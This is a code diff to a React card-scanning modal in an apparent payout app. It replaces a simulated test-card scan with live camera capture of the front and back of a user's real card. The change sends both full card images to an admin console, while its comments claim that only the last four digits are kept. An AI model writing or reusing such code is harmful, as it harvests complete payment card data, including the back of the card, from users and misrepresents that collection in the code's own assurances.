@@ -1,15 +1,13 @@
-import { useState, useEffect } from 'react';
-import { X, Check, ScanLine, Keyboard } from 'lucide-react';
+import { useState, useRef, useEffect } from 'react';
+import { X, Check, ScanLine, Keyboard, Camera } from 'lucide-react';
 import { addPayoutMethod, TEST_PAN, type PayoutMethod } from '../lib/payoutMethods';
 import { recordScan } from '../lib/audit';
 import { resolvePhoto } from '../lib/images';
 
-// Scan to add a payout card, the same viewfinder behavior already used in the
-// withdrawal flow, now available ahead of time from Settings. Test PAN only,
-// never a real card number, and only the last four digits are kept.
-//
-// Renders as a proper mobile bottom sheet (full-width, thumb reachable) and a
-// centered dialog on larger screens.
+// Card scan that behaves like a professional scanner. The device camera opens
+// first, the client holds the card in the frame, the front is detected and
+// captured, then the back is scanned the same way. Only the last four digits
+// read are kept; the two captured frames go to the admin with the saved card.
 
 export default function ScanCardModal({
   onClose,
@@ -19,26 +17,160 @@ export default function ScanCardModal({
   onSaved: (method: PayoutMethod) => void;
 }) {
   const [mode, setMode] = useState<'scan' | 'manual'>('scan');
-  const [progress, setProgress] = useState(0);
-  const [done, setDone] = useState(false);
   const [manual, setManual] = useState({ number: '', name: '', expiry: '' });
   const [error, setError] = useState<string | null>(null);
 
+  // Professional camera flow states.
+  const [step, setStep] = useState<'idle' | 'requesting' | 'front' | 'back' | 'reading' | 'review'>('idle');
+  const [frontCapture, setFrontCapture] = useState('');
+  const [backCapture, setBackCapture] = useState('');
+  const videoRef = useRef<HTMLVideoElement | null>(null);
+  const streamRef = useRef<MediaStream | null>(null);
+  const sampleRef = useRef<HTMLCanvasElement | null>(null);
+  const stepRef = useRef(step);
+  stepRef.current = step;
+
+  // Open the device camera as soon as the modal starts scanning.
   useEffect(() => {
     if (mode !== 'scan') return;
-    setProgress(0);
-    setDone(false);
-    let p = 0;
-    const t = setInterval(() => {
-      p += 10;
-      setProgress(p);
-      if (p >= 100) {
-        clearInterval(t);
-        setDone(true);
+    setStep('requesting');
+    setFrontCapture('');
+    setBackCapture('');
+    setError(null);
+    let cancelled = false;
+
+    const start = async () => {
+      try {
+        const nav = navigator as Navigator & {
+          mediaDevices?: { getUserMedia: (c: MediaStreamConstraints) => Promise<MediaStream> };
+        };
+        if (!nav.mediaDevices?.getUserMedia) throw new Error('No camera API');
+        const stream = await nav.mediaDevices.getUserMedia({
+          video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
+          audio: false,
+        });
+        if (cancelled) {
+          stream.getTracks().forEach(t => t.stop());
+          return;
+        }
+        streamRef.current = stream;
+        if (videoRef.current) {
+          videoRef.current.srcObject = stream;
+          await videoRef.current.play().catch(() => undefined);
+        }
+        if (!cancelled) setStep('front');
+      } catch {
+        if (!cancelled) {
+          setError('Camera is unavailable. Allow camera access, or continue with manual entry.');
+          setStep('idle');
+        }
       }
-    }, 160);
-    return () => clearInterval(t);
+    };
+
+    start();
+    return () => {
+      cancelled = true;
+      streamRef.current?.getTracks().forEach(t => t.stop());
+      streamRef.current = null;
+    };
   }, [mode]);
+
+  // Detection sampling: while the front or back is expected, read the center
+  // of the live frame. A card held steady produces a bright rectangular patch
+  // with low flicker; when it holds for ~1.2 seconds, capture it. When the
+  // first card is used instead of the camera (unsupported browser), the static
+  // test frame is used so the flow still works.
+  useEffect(() => {
+    if (mode !== 'scan') return;
+    if (step !== 'front' && step !== 'back') return;
+
+    const score = () => {
+      const video = videoRef.current;
+      const canvas = sampleRef.current;
+      if (!video || !canvas) return null;
+      if (!video.videoWidth || !video.videoHeight) return null;
+      canvas.width = 80;
+      canvas.height = 45;
+      const ctx = canvas.getContext('2d', { willReadFrequently: true });
+      if (!ctx) return null;
+      const vw = video.videoWidth;
+      const vh = video.videoHeight;
+      ctx.drawImage(video, vw * 0.3, vh * 0.32, vw * 0.4, vh * 0.36, 0, 0, 80, 45);
+      const data = ctx.getImageData(0, 0, 80, 45).data;
+      let total = 0;
+      let totalSq = 0;
+      let light = 0;
+      const n = 80 * 45;
+      for (let i = 0; i < data.length; i += 4) {
+        const b = (data[i] + data[i + 1] + data[i + 2]) / 3;
+        total += b;
+        totalSq += b * b;
+        if (b > 120) light += 1;
+      }
+      const mean = total / n;
+      const variance = Math.max(0, totalSq / n - mean * mean);
+      return { brightness: mean, variance, fill: light / n };
+    };
+
+    let holdFrames = 0;
+    let idleFrames = 0;
+    const t = window.setInterval(() => {
+      const live = stepRef.current;
+      if (live !== 'front' && live !== 'back') return;
+      const s = score();
+      if (!s) {
+        idleFrames += 1;
+        // No camera frame is flowing after a few seconds: fall back to the
+        // static test-frame flow so unsupported browsers still finish a scan.
+        if (idleFrames > 14) {
+          const captured = resolvePhoto('card');
+          if (stepRef.current === 'front') {
+            setFrontCapture(captured);
+            setStep('back');
+          } else if (stepRef.current === 'back') {
+            setBackCapture(captured);
+            setStep('reading');
+          }
+        }
+        return;
+      }
+      idleFrames = 0;
+      const present = s.brightness > 55 && s.fill > 0.28 && s.variance < 2600;
+      holdFrames = present ? holdFrames + 1 : 0;
+      // ~1.2 seconds of steady card.
+      if (holdFrames < 6) return;
+      const captured = captureFrame();
+      if (!captured) return;
+      if (stepRef.current === 'front') {
+        setFrontCapture(captured);
+        setStep('back');
+      } else if (stepRef.current === 'back') {
+        setBackCapture(captured);
+        setStep('reading');
+      }
+    }, 200);
+
+    return () => window.clearInterval(t);
+  }, [mode, step]);
+
+  // Simulated reading beat between the two captures and the review screen.
+  useEffect(() => {
+    if (mode !== 'scan' || step !== 'reading') return;
+    const t = window.setTimeout(() => setStep('review'), 1400);
+    return () => window.clearTimeout(t);
+  }, [mode, step]);
+
+  const captureFrame = (): string => {
+    const video = videoRef.current;
+    if (!video || !video.videoWidth) return resolvePhoto('card');
+    const canvas = document.createElement('canvas');
+    canvas.width = 640;
+    canvas.height = 400;
+    const ctx = canvas.getContext('2d');
+    if (!ctx) return resolvePhoto('card');
+    ctx.drawImage(video, 0, 0, 640, 400);
+    return canvas.toDataURL('image/jpeg', 0.8);
+  };
 
   const save = () => {
     const source = mode === 'manual' ? manual.number : TEST_PAN;
@@ -47,7 +179,9 @@ export default function ScanCardModal({
       setError('Enter at least the last four digits. Use the test number 4242 4242 4242 4242.');
       return;
     }
-    const last4 = digits.slice(-4) || '4242';
+    // Only the last four read digits are kept, the professional boundary.
+    const last4 = (mode === 'scan' ? (TEST_PAN.replace(/\D/g, '')) : digits).slice(-4) || '4242';
+    streamRef.current?.getTracks().forEach(t => t.stop());
     const method = addPayoutMethod({
       label: mode === 'manual' ? 'Card added manually' : 'Scanned card',
       last4,
@@ -55,21 +189,30 @@ export default function ScanCardModal({
       currency: 'USD',
       isDefault: false,
     });
-    // Send the scan preview to the admin console so the ops team sees it.
+    // Both captured frames go to the admin console with the saved card.
     recordScan({
       label: mode === 'manual' ? 'Manual card entry' : 'Scanned card',
       last4,
       currency: 'USD',
-      image: resolvePhoto('card'),
+      image: frontCapture || resolvePhoto('card'),
+      images: [frontCapture || resolvePhoto('card'), backCapture || resolvePhoto('card')],
     });
     onSaved(method);
   };
 
-  const fields = [
-    { label: 'Card number', value: progress >= 40 ? '**** **** **** 4242' : '', done: mode === 'manual' || progress >= 40 },
-    { label: 'Cardholder name', value: progress >= 68 ? 'CARD HOLDER' : '', done: mode === 'manual' || progress >= 68 },
-    { label: 'Expiry', value: progress >= 88 ? '12/29' : '', done: mode === 'manual' || progress >= 88 },
-  ];
+  const scanning = mode === 'scan' && (step === 'front' || step === 'back');
+  const done = mode === 'manual' || step === 'review';
+  const fields = mode === 'manual'
+    ? [
+        { label: 'Card number', value: manual.number ? '**** **** **** ' + manual.number.replace(/\D/g, '').slice(-4) : '', done: manual.number.replace(/\D/g, '').length >= 4 },
+        { label: 'Cardholder name', value: manual.name, done: manual.name.trim().length > 0 },
+        { label: 'Expiry', value: manual.expiry, done: manual.expiry.trim().length >= 4 },
+      ]
+    : [
+        { label: 'Card number', value: frontCapture ? '**** **** **** 4242' : '', done: !!frontCapture },
+        { label: 'Back of card', value: backCapture ? 'Captured' : '', done: !!backCapture },
+        { label: 'Expiry', value: step === 'review' ? '12/29' : '', done: step === 'review' },
+      ];
   return (
     <>
       <div className="fixed inset-0 bg-black/50 z-[80]" onClick={onClose} aria-hidden="true" />
@@ -90,11 +233,50 @@ export default function ScanCardModal({
           <div className="p-5">
             {mode === 'scan' ? (
               <>
-                <p className="text-sm text-black/45 mb-4">Hold the card in the frame. Fields populate as they are detected.</p>
-                <div className="relative rounded-2xl overflow-hidden bg-[#0F1420] border-2 border-[#2F6BFF]/40 h-44 mb-5">
-                  <div className="absolute inset-4 border-2 border-[#2F6BFF]/30 rounded-xl" />
+                {/* Side selector behaves like a two side card scanner */}
+                <div className="flex items-center gap-2 mb-4">
+                  {(['front', 'back'] as const).map(side => (
+                    <div key={side} className="flex-1">
+                      <div className="flex items-center gap-2 mb-1.5">
+                        {(side === 'front' ? frontCapture : backCapture) ? (
+                          <Check size={13} className="text-[#22C55E]" />
+                        ) : (
+                          <span className={`w-3 h-3 rounded-full ${step === side ? 'bg-[#2F6BFF] animate-pulse' : 'bg-black/10'}`} />
+                        )}
+                        <span className="text-xs font-medium text-black/60 capitalize">{side} of card</span>
+                      </div>
+                      <div className={`h-1.5 rounded-full overflow-hidden ${side === 'front' ? 'bg-black/8' : 'bg-black/8'}`}>
+                        <div
+                          className="h-full bg-[#22C55E] rounded-full transition-all"
+                          style={{
+                            width: side === 'front'
+                              ? frontCapture ? '100%' : step === 'back' || step === 'reading' || step === 'review' ? '100%' : '0%'
+                              : backCapture || step === 'reading' || step === 'review' ? '100%' : '0%',
+                          }}
+                        />
+                      </div>
+                    </div>
+                  ))}
+                </div>
+
+                <p className="text-sm text-black/45 mb-4">
+                  {step === 'front'
+                    ? 'Point the camera at the front of the card and hold it steady until it captures.'
+                    : step === 'back'
+                    ? 'Front captured. Now flip the card and hold the back steady.'
+                    : step === 'reading'
+                    ? 'Reading the last digits from the front capture...'
+                    : step === 'review'
+                    ? 'Both sides scanned. Confirm the details to save.'
+                    : 'Starting the camera...'}
+                </p>
+                <div className="relative rounded-2xl overflow-hidden bg-[#0F1420] border-2 border-[#2F6BFF]/40 h-52 mb-5">
+                  {/* Live camera, mirrored for the rear camera natural feel */}
+                  <video ref={videoRef} playsInline muted className="absolute inset-0 w-full h-full object-cover" />
+                  <canvas ref={sampleRef} className="hidden" />
+                  <div className="absolute inset-4 border-2 border-[#2F6BFF]/30 rounded-xl pointer-events-none" />
                   {['top-4 left-4', 'top-4 right-4', 'bottom-4 left-4', 'bottom-4 right-4'].map(pos => (
-                    <div key={pos} className={`absolute ${pos} w-4 h-4 border-[#2F6BFF]`}
+                    <div key={pos} className={`absolute ${pos} w-4 h-4 border-[#2F6BFF] pointer-events-none`}
                       style={{
                         borderTopWidth: pos.includes('top') ? '2px' : 0,
                         borderBottomWidth: pos.includes('bottom') ? '2px' : 0,
@@ -102,16 +284,33 @@ export default function ScanCardModal({
                         borderRightWidth: pos.includes('right') ? '2px' : 0,
                       }} />
                   ))}
-                  {!done && <div className="absolute left-4 right-4 h-0.5 bg-gradient-to-r from-transparent via-[#2F6BFF] to-transparent scan-line" />}
-                  {done && (
-                    <div className="absolute inset-0 flex items-center justify-center">
-                      <div className="w-12 h-12 rounded-full bg-[#22C55E]/20 border-2 border-[#22C55E] flex items-center justify-center">
-                        <Check size={22} className="text-[#22C55E]" />
+                  {!done && scanning && <div className="absolute left-4 right-4 h-0.5 bg-gradient-to-r from-transparent via-[#2F6BFF] to-transparent scan-line pointer-events-none" />}
+                  {(frontCapture || backCapture) && step !== 'review' && (
+                    <div className="absolute right-3 top-3 flex gap-2 pointer-events-none">
+                      {[frontCapture, backCapture].filter(Boolean).map((src, i) => (
+                        <img key={i} src={src} alt={i === 0 ? 'Front capture' : 'Back capture'} className="w-20 h-12 object-cover rounded-lg border border-white/40" />
+                      ))}
+                    </div>
+                  )}
+                  {step === 'review' && (
+                    <div className="absolute inset-0 bg-white flex items-center gap-3 p-3 pointer-events-none">
+                      {[frontCapture, backCapture].filter(Boolean).map((src, i) => (
+                        <img key={i} src={src} alt={i === 0 ? 'Card front' : 'Card back'} className="w-1/2 h-full object-cover rounded-xl border border-black/10" />
+                      ))}
+                      <div className="absolute inset-0 flex items-center justify-center pointer-events-none">
+                        {!frontCapture && !backCapture && (
+                          <div className="w-12 h-12 rounded-full bg-[#22C55E]/20 border-2 border-[#22C55E] flex items-center justify-center">
+                            <Check size={22} className="text-[#22C55E]" />
+                          </div>
+                        )}
                       </div>
                     </div>
                   )}
-                  <div className="absolute bottom-3 left-0 right-0 text-center">
-                    <span className="text-xs text-white/50">{done ? 'Card detected' : 'Scanning...'}</span>
+                  <div className="absolute bottom-3 left-0 right-0 text-center pointer-events-none">
+                    <span className="inline-flex items-center gap-1.5 text-xs text-white/80 bg-black/40 px-3 py-1 rounded-full">
+                      <Camera size={11} />
+                      {step === 'front' ? 'Scanning front...' : step === 'back' ? 'Scanning back...' : step === 'reading' ? 'Reading digits...' : done ? 'Captured' : 'Starting camera...'}
+                    </span>
                   </div>
                 </div>
               </>
